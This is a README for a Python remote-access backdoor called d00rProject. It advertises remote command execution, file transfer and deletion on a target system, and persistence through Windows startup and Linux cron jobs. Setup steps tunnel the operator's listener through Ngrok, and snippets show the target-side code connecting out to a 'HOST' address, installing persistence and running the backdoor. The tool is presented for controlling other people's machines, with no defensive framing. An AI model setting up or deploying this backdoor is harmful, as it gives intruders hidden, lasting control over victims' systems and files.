# RCE backdoor

This backdoor written in Python allows you to control a target system remotely. The backdoor provides various commands for executing system commands, navigating the file system, and managing files. It also has a persistence mechanism in case the target PC gets turned off.

## Features

- Remote execution of system commands
- Changing the working directory
- Listing files and directories
- Downloading files from the target system
- Uploading files to the target system
- Deleting files and directories
- Persistence (Windows startup and Linux cron job)

## Usage (get_shell.py)

d00rProject works outside your local network, to do so you can set up a tunnel using Ngrok's TCP feature. Follow these steps:

1. Download and install Ngrok from [https://ngrok.com/download](https://ngrok.com/download).

2. In a terminal, navigate to the directory where Ngrok is installed and run the following command to create a TCP tunnel:

```bash
ngrok tcp 1337
```
Then copy paste the tunnel address ngrok generated into get_shell.py

```python
def main():
    target = "HOST"
    port = 1337
    my_backdoor = Backdoor(target, port)
    persistence()
    my_backdoor.run()
````
## Usage (listener.py)

Set the correct port in the listener and execute.
````python
my_listener = Listener("0.0.0.0", 1337)

my_listener.run()
````
